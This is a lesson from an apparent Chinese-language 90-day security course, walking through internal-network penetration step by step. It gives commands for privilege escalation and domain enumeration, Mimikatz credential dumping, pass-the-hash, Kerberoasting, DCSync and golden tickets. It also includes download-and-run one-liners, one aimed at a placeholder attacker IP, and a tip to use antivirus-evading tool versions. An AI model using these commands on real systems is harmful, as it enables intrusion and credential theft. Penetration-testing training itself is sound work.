---
title: Day084：综合实战项目 - 完整渗透流程（二）
tags:
  - 网络安全
  - 渗透测试
  - 综合实战
categories:
  - 90天安全突击
stage: 实战演练
abbrlink: 80417
date: 2026-01-28
updated: 2026-01-28
---

# Day084：综合实战项目 - 完整渗透流程（二）

## 📋 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 🏆 实战演练（第三阶段） |
| **所属周次** | Week 14：综合实战项目 |
| **今日主题** | 完整渗透流程（二）- 内网渗透 |
| **预计时间** | 4-6 小时 |
| **难度等级** | ⭐⭐⭐⭐⭐ 高级 |

---

## 🔥 今日痛点场景

> **场景**：你已经获得了初始访问权限，现在需要在内网中进一步渗透，获取更高权限。
>
> **问题**：如何进行权限提升和横向移动？
>
> **今天的任务**：完成内网渗透，获取域控或 root 权限。

---

## 🎯 今日目标

- [ ] 完成权限提升
- [ ] 进行内网信息收集
- [ ] 完成横向移动
- [ ] 获取最高权限

**闯关条件**：获取域管权限或 root 权限。

---

## ⚔️ 实战任务（先动手！）

### 任务 1：权限提升（90 分钟）

**Linux 提权检查**：

```bash
# 自动化工具
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 手动检查
id
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
ls -la /etc/passwd /etc/shadow
uname -a
```

**Windows 提权检查**：

```powershell
# 自动化工具
IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/winPEASany.exe')

# 手动检查
whoami /priv
net localgroup administrators
systeminfo
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"
```

**记录提权路径**：

```markdown
## 提权过程

### 初始权限
- 用户：___
- 权限级别：___

### 发现的提权点
| 类型 | 详情 | 利用可能性 |
|------|------|------------|
| | | |

### 利用过程
1. ___
2. ___
3. ___

### 最终权限
- 用户：___
- 权限级别：___
```

---

### 任务 2：内网信息收集（60 分钟）

**域环境枚举**：

```powershell
# 域信息
Get-ADDomain
Get-ADUser -Filter * | Select-Object Name,SamAccountName
Get-ADComputer -Filter * | Select-Object Name,DNSHostName
Get-ADGroup -Filter * | Select-Object Name

# BloodHound 数据收集
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
```

**凭据收集**：

```cmd
:: Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
mimikatz # lsadump::dcsync /user:Administrator

:: SAM 导出
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
```

**网络发现**：

```bash
# 内网扫描（通过代理）
proxychains4 nmap -sT -Pn 10.0.0.0/24

# 或使用 ligolo-ng、chisel 建立隧道后直接扫描
```

---

### 任务 3：横向移动（90 分钟）

**Pass the Hash**：

```bash
# 使用 Hash 登录
proxychains4 crackmapexec smb 10.0.0.0/24 -u Administrator -H 'HASH' --local-auth

# 获取 shell
proxychains4 impacket-psexec Administrator@10.0.0.100 -hashes :HASH
proxychains4 impacket-wmiexec Administrator@10.0.0.100 -hashes :HASH
```

**Kerberos 攻击**：

```bash
# Kerberoasting
impacket-GetUserSPNs -dc-ip 10.0.0.1 domain/user:password -request

# AS-REP Roasting
impacket-GetNPUsers -dc-ip 10.0.0.1 domain/ -usersfile users.txt -no-pass
```

**域控攻击**：

```bash
# DCSync
impacket-secretsdump domain/Administrator@10.0.0.1 -hashes :HASH

# 使用 krbtgt Hash 创建黄金票据
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-xxx /krbtgt:xxx /ptt
```

---

### 任务 4：记录攻击路径（30 分钟）

**攻击链图**：

```
初始入口 ──→ Web 漏洞利用 ──→ 获取 webuser shell
                                    │
                                    ▼
                              权限提升（sudo 配置错误）
                                    │
                                    ▼
                              获取 root/本地管理员
                                    │
                                    ▼
                              凭据收集（Mimikatz）
                                    │
                                    ▼
                              横向移动（PTH）
                                    │
                                    ▼
                              域控攻击（DCSync）
                                    │
                                    ▼
                              获取所有 Hash
```

---

## ✅ 今日闯关检查

| 检查项 | 状态 |
|--------|------|
| 完成权限提升 | ⬜ |
| 完成内网枚举 | ⬜ |
| 获取有效凭据 | ⬜ |
| 完成横向移动 | ⬜ |
| 获取最高权限 | ⬜ |

---

## 📖 底层补课（做完实验再看）

### 提权路径总结

| 系统 | 常见路径 |
|------|----------|
| Linux | SUID, sudo 配置, 内核漏洞, cron |
| Windows | 服务配置, UAC 绕过, 未打补丁, AlwaysInstallElevated |

### 横向移动方法

| 方法 | 前提条件 | 特点 |
|------|----------|------|
| PTH | NTLM Hash | 不需要明文密码 |
| PTT | Kerberos 票据 | 不触发登录事件 |
| PsExec | 管理员权限 | 简单直接 |
| WMI | DCOM 权限 | 较隐蔽 |

---

## ⚠️ 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| 杀软拦截 | 工具无法运行 | 使用免杀版本 |
| 网络不通 | 无法横向 | 建立隧道/代理 |
| Hash 无效 | PTH 失败 | 确认 Hash 类型和目标 |

---

## 💡 知识卡片速查

### 关键命令

| 目的 | 命令 |
|------|------|
| 导出凭据 | `sekurlsa::logonpasswords` |
| PTH | `impacket-psexec -hashes` |
| DCSync | `impacket-secretsdump` |

---

## 🚀 明日预告

**Day 085：综合实战项目 - 完整渗透流程（三）**

明天你将：
- 完成目标达成
- 整理所有发现
- 准备报告素材

---

## 📊 学习记录（学习者填写）

| 项目 | 内容 |
|------|------|
| 实际学习日期 | ____年__月__日 |
| 实际用时 | ____ 小时 |
| 提权方式 | |
| 获取的凭据 | |
| 横向移动路径 | |
| 最终权限 | |
| 遇到的问题 | |

---

> 💬 **导师点评**：
>
> 内网渗透是技术的综合运用。
>
> 如果卡住了，回顾之前学的技术，一定有某个点可以突破。
>
> 记得记录每一步，这是报告的核心内容！

```bash
echo "Day 084 Complete! 内网渗透完成！"
```
